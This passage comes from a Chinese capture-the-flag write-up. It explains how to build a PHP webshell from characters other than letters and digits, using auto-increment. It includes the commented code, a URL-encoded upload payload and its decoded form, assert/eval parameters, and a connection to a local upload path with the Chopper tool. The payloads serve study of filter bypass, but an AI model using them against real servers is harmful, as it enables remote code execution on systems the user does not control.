    $_=++$_; //d
    $_=++$_; //e
    $__.=$_; //E  把两个短杠赋值为E
    $_=++$_; //F  一个短杠继续自增
    $_=++$_; //G 
    $__=$_.$__; // GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE
    $_=++$_; //H 此处一个短杠继续自增，为H
    $_=++$_; //I
    $_=++$_; //J
    $_=++$_; //k
    $_=++$_; //L
    $_=++$_; //M
    $_=++$_; //N
    $_=++$_; //O
    $_=++$_; //P
    $_=++$_; //Q
    $_=++$_; //R
    $_=++$_; //S
    $_=++$_; //T
    $__.=$_; // GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.=拼接，构成get
    ${'_'.$__}[_](${'_'.$__}[__]); // 进行拼接，$_GET['_']($_GET['__']);
对上边代码在php中意思不明白的话可以自己运行var_dump()一下  
`.=`是字符串的连接，具体参看php语法。  
在这里如果还不明白为什么要构造出`$_GET['_']($_GET['__'])`继续往后看  
由于+在传送中会被解释为空格，所以需要提前url编码为%2b,然后还需要去掉上面的这个webshell中的空格，换行。写入文件的payload如下：
    ？c=%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b
url解码后原始写入文件payload：
    ?c=$_=[].[];$__='';$_=$_[''];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;${'_'.$__}[_](${'_'.$__}[__]);
对写入文件payload的解释：  
`$_GET['_']($_GET['__'])` 这个意思是函数名和函数的参数可控。  
既然可控，那么前面`_`可以取`assert`，`__`可以取`$_POST`从而完成一句话的写入  
（以前并没有遇到过这种写shell的方法，感谢1x2Bytes师傅给我讲明这种方法。我见识太浅了。）  
**步骤思路总结：**  
**第一步：构造上传文件**  
首先看代码逻辑，代码逻辑是使用get的方法传入参数，并把参数保存在upload文件夹下的文件中，此时传入的就是`$_GET['_']($_GET['__'])`，文件中写入的也就是`$_GET['_']($_GET['__'])`到此第一步写入文件结束  
**第二步：传参准备连刀**  
因为第一步我们已经成功将`$_GET['_']($_GET['__'])`写入到文件中，第二步就是传参，`_=assert&__=eval("$_POST[c]")`，以get的方式传参，因为此时已经是在上传文件的目录下，所以就没有waf的防护。  
连菜刀：  
`127.0.0.1/uploads/vVyyxGUTyFsL0tgdvmCjVkvRAehduvvQ.php?_=assert&__=eval("$_POST[c]")`  
成功getshell：  
**第二种方法：直接传参**
post：_=phpinfo  
还可以直接连菜刀（此处感谢灵灵表哥点明低版本菜刀可以连这个一句话）  
成功：  
一开始连刀失败，post利用成功。我本以为`$assert($post[_])`是个动态函数，不能连刀，请教灵灵表哥后知道，低版本（1.0）菜刀可以连这个一句话。  
**步骤思路总结：**
  * 传参直接写入一句话
  * 使用post方法或者菜刀（低版本）进行利用
至此，两种利用方法都成功的演示。
# 总结：
  1. 本题所用到的知识点除了读懂题目代码意思以外，重点在于如何构造无数字字母以及限制字符的webshell。可用到的三个方法：自增，异或，取反。上边的payload也不是题目的唯一解，因为构造webshell的大方法虽然定下了，但是webshell的写法确有很多很多，所以如果这篇文章引起了你的兴趣也可以试着构造一下其他的webshell连接一下。
  2. 在做题的过程中，也发现了自己的一些知识短板，暴露出知识盲区，这也是导致我这个题目研究很久才拿下的原因，比如上面构造webshell的方法和webshell的写法（尤其是第一种webshell的写法）。
  3. 在后面的时间，我也会跟着P牛对应的两篇文章介绍的三种方法进行自己学习和总结，这里只用到了自增这个方法，还需要总结整理一下一句话木马的写法，补一下短板。
  4. 收获就是啃完这个题目自己对代码审计的思路更加清晰，更加有针对性，也学到了遇到困难时不妨先写个demo运行一下，知识的学习总归是肤浅的，我更需要在练习过程中学到一些做题思路和思维方法。